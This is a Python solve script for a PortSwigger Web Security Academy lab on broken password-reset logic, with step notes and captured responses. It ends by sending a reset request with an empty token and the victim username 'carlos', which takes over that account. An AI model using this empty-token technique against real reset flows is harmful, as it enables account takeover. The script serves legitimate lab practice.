# Lab: Password reset broken logic

import requests
import re

base = "https://0a9f00d803b1289b808322c100550025.web-security-academy.net"
tmp_session = requests.Session()

# print("===========[step1] Recon login fail message===============")
# page_forgot_pass=tmp_session.get(f"{base}/forgot-password")
# page_forgot_pass_result=page_forgot_pass.text
# print(page_forgot_pass_result)
# '''
#                     <header class="notification-header">
#                     </header>
#                     <form name=forgot-password class=login-form method=POST>
#                         <label>Please enter your username or email</label>
#                         <input required type=text name=username>
#                         <button class=button type=submit> Submit </button>
#                     </form>
# '''

# print("===========[step2] reset carlos's password===============")
# page_reset = tmp_session.post(f"{base}/forgot-password", data={"username": "carlos"}, allow_redirects=False)
# print(page_reset.status_code, page_reset.headers.get("Location"))
# print(page_reset.text)
# '''
# <p>Please check your email for a reset password link.</p>
# '''

print("===========[step3] login with wiener's Credential===============")
wiener_session = requests.Session()
page_login=wiener_session.post(f"{base}/login", data={"username": "wiener", "password": "peter"})
page_result=page_login.text
print(page_result)
'''
                        <p>Your username is: wiener</p>
                        <p>Your email is: <span id="user-email">wiener@exploit-0a6700a703b028c480ce21fe01bf0077.exploit-server.net</span></p>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <button class='button' type='submit'> Update email </button>
                        </form>
'''

# print("===========[step4] reset wiener's password===============")
# page_reset = wiener_session.post(f"{base}/forgot-password", data={"username": "wiener"}, allow_redirects=False)
# #print(page_reset.status_code, page_reset.headers.get("Location"))
# print(page_reset.text)
# '''
#                             <a href="/my-account?id=wiener">My account</a><p>|</p>
#                         </section>
#                     </header>
#                     <header class="notification-header">
#                     </header>
#                     <p>Please check your email for a reset password link.</p>
# '''

print("===========[step5] Check email===============")
mail_url = "https://exploit-0a6700a703b028c480ce21fe01bf0077.exploit-server.net"
page_email=wiener_session.get(f"{mail_url}/email")
print(page_email.text)

# So, i pressed reset button twice, on /forgoet-password theres' argument named "temp-forgot-password-token" and the token name is random string
'''
<pre style='white-space: pre-wrap; word-break: break-all'>Hello!

Please follow the link below to reset your password.

<a href='https://0a9f00d803b1289b808322c100550025.web-security-academy.net/forgot-password?temp-forgot-password-token=9dr7x8i7btr5q1w3z7gxbv3ktt0371el' target=_blank>https://0a9f00d803b1289b808322c100550025.web-security-academy.net/forgot-password?temp-forgot-password-token=9dr7x8i7btr5q1w3z7gxbv3ktt0371el</a>

Thanks,
Support team</pre>
'''
'''
<pre style='white-space: pre-wrap; word-break: break-all'>Hello!

Please follow the link below to reset your password.

<a href='https://0a9f00d803b1289b808322c100550025.web-security-academy.net/forgot-password?temp-forgot-password-token=8qiy5u06045yrxs99916tswhajwxvof8' target=_blank>https://0a9f00d803b1289b808322c100550025.web-security-academy.net/forgot-password?temp-forgot-password-token=8qiy5u06045yrxs99916tswhajwxvof8</a>

Thanks,
Support team</pre>
'''
reset_pass_token = re.search(r'temp-forgot-password-token=(\w+)', page_email.text).group(1)
print(f"latest token is {reset_pass_token}")

print("===========[step6] Click reset link===============")
page_reset_link=wiener_session.get(f"{base}/forgot-password", params={"temp-forgot-password-token": reset_pass_token}, allow_redirects=False)
print(page_reset_link.status_code)
print(page_reset_link.text)
'''
                    <form class=login-form method=POST>
                        <input required type=hidden name=temp-forgot-password-token value=9dr7x8i7btr5q1w3z7gxbv3ktt0371el>
                        <input required type=hidden name=username value=wiener>
                        <label>New password</label>
                        <input required type=password name=new-password-1>
                        <label>Confirm new password</label>
                        <input required type=password name=new-password-2>
                        <button class='button' type='submit'> Submit </button>
                    </form>
'''

# [!] before process step7 i concerned below request
'''
POST /forgot-password?temp-forgot-password-token= HTTP/2
Host: 0a9f00d803b1289b808322c100550025.web-security-academy.net
Cookie: session=NPDzl0yW4hDLONwii8mfkUgh21M0AIPL
Content-Length: 91
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://0a9f00d803b1289b808322c100550025.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9f00d803b1289b808322c100550025.web-security-academy.net/forgot-password?temp-forgot-password-token=9dr7x8i7btr5q1w3z7gxbv3ktt0371el
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

temp-forgot-password-token=&username=wiener&new-password-1=testpass&new-password-2=testpass
'''
print("===========[step7] Submit new password===============")
page_reset_target=wiener_session.post(f"{base}/forgot-password?temp-forgot-password-token=", data={"temp-forgot-password-token":"", "username": "carlos", "new-password-1": "testpass", "new-password-2": "testpass"})
print(page_reset_target.status_code)
print(page_reset_target.text)